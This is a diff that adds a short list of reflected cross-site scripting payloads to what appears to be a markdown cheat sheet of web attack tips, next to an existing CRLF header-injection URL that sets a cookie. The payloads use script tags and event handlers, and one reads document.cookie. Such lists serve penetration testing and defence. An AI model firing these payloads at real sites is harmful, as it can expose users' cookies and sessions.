@@ -104,3 +104,13 @@ Hot XSS tip: did you know `window.alert?.()` and `(window?.alert)` will pop an a
 ```text
 https://www.abc.com/%0D%0ASet-Cookie:crlfinjection=crlfinjection
 ```
+
+## Reflected XSS Successfull payloads
+```js
+<b onmouseover=alert('Wufff!')>click me!</b>
+"><script>propmt("mamunwhh")</script>
+"><script>alert(document.cookie)</script>
+/><svg src=x onload=confirm("1337");>
+"><div onmouseover="alert('XSS');">Hello :)
+```
+
